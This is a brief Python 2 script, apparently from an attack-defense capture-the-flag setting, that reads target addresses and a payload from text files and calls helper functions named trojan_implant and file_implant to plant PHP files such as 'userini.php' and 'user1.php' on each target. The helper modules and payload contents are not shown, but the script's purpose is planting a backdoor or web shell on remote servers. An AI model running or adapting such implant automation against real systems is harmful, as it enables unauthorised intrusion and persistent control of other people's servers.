from file_module import *
from flag_module import *
from request_module import *
from upload_module import *

target = []
target = read_array('target.txt')
print target

a = read_var('target.txt')
print a

write_txt('result.txt',a)

test(target[0])

address = read_var('add.txt')

payload = read_var('111.txt')

print payload

trojan_implant(target[1]+address,'userini.php','user1.php','a')

file_implant(target[1]+address,'userini.php','hhhh.txt','nihaoma','a')

file_tree('./')